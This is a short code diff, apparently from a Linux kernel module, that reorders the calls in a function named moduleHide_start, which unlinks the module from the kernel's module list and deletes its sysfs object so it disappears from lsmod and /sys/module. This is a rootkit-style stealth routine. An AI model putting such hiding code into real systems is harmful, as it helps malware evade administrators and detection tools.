@@ -24,8 +24,9 @@ int moduleHide_start(void) {
 	list_del(&THIS_MODULE->list);
 
 	// Hide from /sys/module
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+
 
 
 	return 0;
